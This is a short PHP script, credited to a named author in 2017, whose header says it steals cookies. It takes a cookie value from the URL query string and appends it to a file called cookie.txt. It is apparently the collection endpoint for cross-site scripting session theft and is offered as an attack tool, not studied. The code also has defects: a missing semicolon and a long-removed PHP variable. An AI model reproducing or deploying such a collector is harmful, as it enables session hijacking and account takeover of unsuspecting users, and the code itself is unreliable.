//Author: Nahid Sarker
//Date created: 9/19/2017
//Date modified: 9/19/2017
//Purpose: Steals cookies and stores infrmation in a file called cookie.txt
//Created on Ubuntu 16.04.3 LTS
//Tested on Ubuntu 16.04.3 LTS

<?php
    $cookie = $HTTP_GET_VARS["cookie"];
    echo $cookie
    $steal = fopen("cookie.txt", "a");
    fwrite($steal, $cookie ."\n");
    fclose($steal);
?>
